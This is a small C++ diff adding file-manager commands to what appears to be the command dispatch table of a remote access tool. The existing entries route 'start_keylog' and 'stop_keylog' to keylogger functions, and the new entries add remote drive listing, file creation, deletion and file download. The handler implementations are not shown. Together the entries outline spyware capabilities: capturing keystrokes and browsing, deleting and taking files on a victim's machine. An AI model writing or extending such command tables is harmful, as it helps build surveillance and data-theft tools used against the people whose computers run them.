@@ -3,6 +3,7 @@
 #include <functional>
 #include <nlohmann/json.hpp>
 #include "ProcessHandlers.h"
+#include "FileHandlers.h"
 
 using json = nlohmann::json;
 
@@ -49,5 +50,13 @@ public:
         // Keylogger
         map["start_keylog"] = ProcessHandlers::startKeylog;
         map["stop_keylog"] = ProcessHandlers::stopKeylog;
+    
+        // FILE MANAGER HANDLERS
+        map["fs_drives"] = FileHandlers::listDrives;
+        map["fs_list"] = FileHandlers::listDirectory;
+        map["fs_mkdir"] = FileHandlers::createDirectory;
+        map["fs_mkfile"] = FileHandlers::createFile;
+        map["fs_delete"] = FileHandlers::deleteItem;
+        map["fs_download"] = FileHandlers::downloadFile;
     }
 };
